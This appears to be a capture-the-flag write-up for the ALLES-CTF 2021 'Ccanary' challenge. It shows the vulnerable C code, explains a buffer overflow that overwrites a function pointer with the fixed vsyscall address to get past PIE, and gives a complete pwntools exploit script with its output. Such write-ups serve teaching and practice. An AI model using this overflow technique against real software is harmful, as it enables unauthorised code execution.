## Pwn

### Code analysis

**Buffer-overflow** spotted !!!

```c
// FIXME: this partial-overwrite mitigation sucks :/
void quotegets(char* inp) {
    *inp = '"';
    // read input
    for (; *inp != '\n';)
        *++inp = fgetc(stdin);
    // append postfix
    for (char* postfix = "\"\n- you, 2021"; *postfix; postfix++)
        *inp++ = *postfix;
    // NUL-terminate
    *inp = 0;
}
```


Look at the main function. We can override the `call_canary()` function address and `give_flag` inside struct variable.

```c
int main(void) {
    ignore_me_init_buffering();
    struct data data = {
        .yourinput = { 0 },
        .call_canary = canary,
        .give_flag = 0,
    };

    printf("quote> ");
    quotegets((char*) &data.yourinput);

    data.call_canary();
    puts("good birb!");

    puts("");
    puts((char*) &data.yourinput);

    if (data.give_flag) {
        puts("Here's the flag:");
        system("cat flag");
    }
    return 0;
}
```


### Exploit

Unfortunately, the binary has **PIE** enabled ( ASLR ), which mean the function's address of `call_back` is random in every execution.

```bash
[*] '/home/kali/ALLES-CTF-2021/Ccanary/ccanary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Thanks to some awesome write-up on the internet, I stumble across the [vsyscall](http://terenceli.github.io/技术/2019/02/13/vsyscall-and-vdso)

Vsyscall addresses are fixed in every execution. Start of `vsyscall`
```c
    #define VSYSCALL_ADDR_vgettimeofday   0xffffffffff600000
    #define VSYSCALL_ADDR_vtime           0xffffffffff600400
    #define VSYSCALL_ADDR_vgetcpu          0xffffffffff600800
```

When we change to the address `0xffffffffff600000` , worked like a charm

```bash
┌──(kali㉿kali)-[~/ALLES-CTF-2021/Ccanary]
└─$ python3 tinker.py
[+] Opening connection to 7b000000c117bbce0a6aee01-ccanary.challenge.master.allesctf.net on port 31337: Done
[*] Switching to interactive mode
good birb!

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Here's the flag:
ALLES!{th1s_m1ght_n0t_work_on_y0ur_syst3m_:^)}

```

Full code:
```python
from pwn import *

payload = b"A"*31 + p64(0xffffffffff600000)
p = remote("7b000000c117bbce0a6aee01-ccanary.challenge.master.allesctf.net",31337, ssl=True)
p.sendlineafter(b"quote> ",payload)
p.interactive()
```